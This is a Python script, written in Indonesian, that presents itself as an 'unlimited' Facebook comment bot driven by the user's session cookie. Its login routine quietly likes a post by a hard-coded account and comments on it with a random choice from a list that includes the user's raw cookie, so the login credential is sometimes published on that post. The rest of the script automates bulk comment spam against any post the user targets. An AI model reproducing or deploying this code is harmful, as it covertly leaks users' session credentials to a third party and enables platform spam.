# Coded by Dikidjatar
########################## GOOD LUCK ########################## 
import os, random, re, time, datetime

from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

import requests
# banner
def banner():
   print(Panel('''
[bold red]88""Yb  dP"Yb 888888 88   88  dP"Yb  88 88   88 88
88__dP dP   Yb  88   88  88  dP   Yb 88  88 88  88
[bold yellow]88"""  Yb   dP  88   88 88   Yb   dP 88   88    88
[bold green]88  Yb Yb   dP  88   88  88  Yb   dP 88         88
8bodP   YbodP   88   88   88  YbodP  88         88
''', style="bold white", width=55))
# clear layar
def clear_layar():
   try:os.system('cls' if os.name == 'nt' else 'clear')
   except:pass
# remove cookie
def remove():
   try:os.system('rm Data/cookie.txt')
   except:pass

def login():
   clear_layar()
   banner()
   print(Panel("[italic white]Silahkan Masukan[italic yellow] Cookie[italic white] Facebook, Jangan Gunakan[italic red] Mode Gratis[italic white] Saat Mendapatkan Cookie.", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
   cookie = Console().input("[bold white]   ╰─> ")
   try:
      with requests.Session() as r:
         r.headers.update({
            'sec-fetch-mode': 'navigate',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'none',
            'accept-language': 'en-US,en;q=0.9',
            'sec-fetch-dest': 'document',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Host': 'mbasic.facebook.com',
         })
         djatar = r.get('https://mbasic.facebook.com?_rdr', cookies = {
            'cookie': cookie
         }).text
         if 'id="mbasic_logout_button">' in str(djatar):
            urlpost = '/100010450276658/posts/pfbid02vNVQLM2dj7BTQq8VFbPCZPo1z7dip5ZZXC2mfi81JQs31bRTJVtsa7AissvMXeksl/?app=fbl'
            respon_urlpost = r.get('https://mbasic.facebook.com{}'.format(urlpost), cookies = {
               'cookie': cookie
            }).text
            find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost)).group(1).replace('amp;', '')
            find_urlcomment = re.search('method="post" action="(.*?)"', str(respon_urlpost)).group(1).replace('amp;', '')
            fbdtsg = re.search('name="fb_dtsg" value="(.*?)"', str(respon_urlpost)).group(1)
            jazoest = re.search('name="jazoest" value="(\d+)"', str(respon_urlpost)).group(1)
            r.get('https://mbasic.facebook.com{}'.format(find_urllike), cookies = {
               'cookie': cookie
            })
            text_dtr = random.choice(['Programmer ka bang @[100010450276658:], Mantap!', 'Hallo bang @[100010450276658:]', 'Izin pake script lu bang @[100010450276658:]', 'Mantap', '@[100010450276658:] ganteng😎', '😎😎🤣', 'Bang minta script', 'Gw pake script lu bang @[100010450276658:]', cookie])
            data = {
               'fb_dtsg': fbdtsg,
               'jazoest': jazoest,
               'comment_text': text_dtr
            }
            r.post('https://mbasic.facebook.com{}'.format(find_urlcomment), data = data, cookies = {
               'cookie': cookie
            })
            open('Data/cookie.txt', 'w').write(cookie)
            open('Data/cookie.txt')
            print(Panel('[bold green]Berhasil login! [bold yellow]Tolong gunakan script ini dengan bijak, jika terjadi sesuatu admin tidak bertanggung jawab', width=55))
            time.sleep(3)
            choose()
         else:
            print(Panel('[bold red]Gagal mengambil data, kemungkinan [bold yellow]Cookie [bold red] anda sudah kedaluarsa, silahkan ganti [bold yellow] Cookie [bold red]baru.', style="bold white", width=55));time.sleep(5);login()
   except Exception as e:
      print(e)

def choose():
   try:clear_layar();banner()
   except:pass
   print(Panel('''[bold yellow][0] Keluar
[bold cyan][01] Bot komentar facebook unlimited
[bold green][02] Ganti cookie''', style="bold white", width=55))
   pilihan = Console().input('[bold magenta] > ')
   if pilihan in [""]:print(Panel('[bold red]Lu harus pilih salah satu, tidak boleh kosong!', style="bold white", width=55));time.sleep(3);choose()
   elif pilihan in ["0", "00"]:logout()
   elif pilihan in ["1", "01"]:main()
   elif pilihan in ["2", "02"]:remove();time.sleep(1);login()
   else:
      print(Panel('[bold red]Lu harus pilih antara [bold green] 0, 1 [bold red]dan [bold green]3 [bold red]Ngawur ajg.', style="bold white", width=55));time.sleep(3);choose()
   
def main():
   try:
      cok = open('Data/cookie.txt', 'r').read()
   except:
      print(Panel('[bold cyan]Login dulu ngab...', width=55))
      time.sleep(3);login()
   print(Panel("[bold magenta]Masukan link postingan target", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
   link = Console().input("[bold white]   ╰─> ")
   print(Panel("[bold cyan]Silahkan masukan text komentar, [bold green] pisahkan dengan tanda [bold red]+ [bold cyan]untuk komentar yang berbeda, dan gunakan garis miring [bold red]/ [bold green]untuk baris baru", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
   tulis_komentar = Console().input("[bold white]   ╰─> ").replace('/', '\n')
   print(Panel("[bold green]Masukan Jumlah Komentar", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
   jumlah = Console().input("[bold white]   ╰─> ")
   try:
      with requests.Session() as r:
         url = "https://mbasic.facebook.com"
         r.headers.update({
            'sec-fetch-mode': 'navigate',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'none',
            'accept-language': 'en-US,en;q=0.9',
            'sec-fetch-dest': 'document',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Host': 'mbasic.facebook.com',
         })
         data = r.get(url + '/?_rdr', cookies = {'cookie': cok}).text
         if 'id="mbasic_logout_button">' in str(data):
            link_postingan = re.search(r"/\d+/posts/[\w-]+/\?app=fbl", link).group()
            response = r.get(url + link_postingan, cookies = {'cookie': cok}).text
            find_urlcomment = re.search('method="post" action="(.*?)"', str(response)).group(1).replace('amp;', '')
            fbdtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response)).group(1)
            jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
            n = 0
            while n < int(jumlah):
               n += 1
               onetext_komentar = random.choice(tulis_komentar.split('+'))
               text_komentar = (f"""{onetext_komentar}

{datetime.datetime.now().strftime("%d/%B/%Y %H:%M:%S")}""")
               r.headers.update({
                  'referer': 'https://mbasic.facebook.com/?_rdr',
                  'sec-fetch-site': 'same-origin',
                  'origin': 'https://mbasic.facebook.com',
                  'content-type': 'application/x-www-form-urlencoded',
               })
               data = {
                  'fb_dtsg': fbdtsg,
                  'jazoest': jazoest,
                  'comment_text': text_komentar
               }
               response2 = r.post(url + find_urlcomment, data = data, cookies = {'cookie': cok})
               if str(response2.url):
                  print(Panel(f'''[bold white]Status [bold green]Berhasil {n}
[bold white]Komentar: [bold blue]{text_komentar}
{datetime.datetime.now().strftime("%d/%B/%Y %H:%M:%S")}''', style="bold green", width=55))
               else:
                  print(Panel(f'''[bold white]Status [bold red]Gagal {n}
[bold white]Komentar: [bold red]{text_komentar}
{datetime.datetime.now().strftime("%d/%B/%Y %H:%M:%S")}''', style="bold red", width=55))
                  
               if n == jumlah:
                  print(Panel('Selesai {}'.format(n), width=55))
                  time.sleep(3)
                  break
         else:
            print(Panel('[bold red]Gagal mengambil data, kemungkinan [bold yellow]Cookie [bold red] anda sudah kedaluarsa, silahkan ganti [bold yellow] Cookie [bold red]baru.', style="bold white", width=55));time.sleep(3)
   except Exception as e:
      print(e)
      
def logout():
   print(Panel('Follow dulu ngab!', style="bold white", width=55))
   time.sleep(1)
   try:os.system('xdg-open https://www.facebook.com/Dikidjatar')
   except:pass

if __name__ == '__main__':
   try:os.system('mkdir Data')
   except:pass
   try:choose()
   except:pass

##################### THANKS ###################